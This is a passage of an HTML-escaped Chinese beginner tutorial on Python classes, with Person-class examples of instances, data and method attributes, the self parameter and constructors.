&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#构造函数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name=name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;类的实例&lt;&#x2F;p&gt;
&lt;p&gt;类是现实世界的抽象的实体，以编程的形式出现，而实例（instance）则是这些对象的具体化&lt;&#x2F;p&gt;
&lt;p&gt;通过实例化，类的方法属性才可以被调用，类的数据属性才可以被访问&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the person class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#构造函数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name=name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;male&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#创建实例，并传入三个参数给构造函数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaohong=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaohong&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;female&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.name)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#访问实例的数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.age)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.gender)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaohong.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;())  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#访问实例的方法属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaohong.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;类的属性&lt;&#x2F;p&gt;
&lt;p&gt;类的属性由数据和方法两部分组成，可以通过点号方式来访问&lt;&#x2F;p&gt;
&lt;p&gt;数据属性存储数据和变量值，方法属性存储操作数据的函数&lt;&#x2F;p&gt;
&lt;p&gt;调用语法：&lt;&#x2F;p&gt;
&lt;p&gt;实例.value&lt;&#x2F;p&gt;
&lt;p&gt;实例.method&lt;&#x2F;p&gt;
&lt;p&gt;属性访问&lt;&#x2F;p&gt;
&lt;p&gt;访问数据属性&lt;&#x2F;p&gt;
&lt;p&gt;数据属性仅仅是所定义的类的变量，数据属性就是静态变量和静态数据&lt;&#x2F;p&gt;
&lt;p&gt;类.value&lt;&#x2F;p&gt;
&lt;p&gt;实例.value&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the person class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name=name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;male&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)  &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaohong=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaohong&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;female&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.version) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#通过实例来访问数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Person.version)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#通过类来访问数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;访问方法属性&lt;&#x2F;p&gt;
&lt;p&gt;类中定义的函数，称之为方法，方法有应用范围，只能在类里面，要调用方法，必须先实例化。&lt;&#x2F;p&gt;
&lt;p&gt;类中函数的原理：&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;类内部的函数与其他的函数没有太大的区别，也可以设置默认参数、关键字参数等&lt;&#x2F;li&gt;
&lt;li&gt;类中所有的函数的第一个参数必须是self，创建实例时，实例名来代替self&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;下面这个例子是方法属性有self参数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printver&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.version)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;P=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;P.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printver&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;下面这个例子是方法属性没有self参数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printver&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.version)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;P=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;P.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printver&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;img src=&quot;images&#x2F;Python&#x2F;image-20200820181708538.png&quot; alt=&quot;image-20200820181708538&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;调用函数时，实例P将自己传入，但是因为没有参数self，所以传入失败&lt;&#x2F;p&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;很多类的第一个函数是构造函数，如果有构造函数，类在实例化的时候，不能传入空参数，必须传入与构造函数里面设置的参数匹配的参数&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;下面这个例子没有构造函数：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;setversion&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;v&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.v=v&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printver&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
